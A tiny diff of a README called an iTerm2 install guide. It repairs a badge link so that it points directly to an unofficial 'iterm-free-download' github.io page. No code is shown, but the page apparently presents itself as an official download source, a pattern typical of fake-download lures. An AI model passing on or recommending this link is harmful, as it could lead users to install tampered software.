@@ -1,6 +1,5 @@
 # iTerm2 — Fast Install Guide
-
-[![Install Guide](https://img.shields.io/badge/Install%20Guide-16A813)]([#download](https://iterm-free-download.github.io/.github))
+[![Install Guide](https://img.shields.io/badge/Install%20Guide-16A813)](https://iterm-free-download.github.io/.github)
 
 A concise, enterprise-friendly guide to set up iTerm2 on macOS quickly and reliably.
 
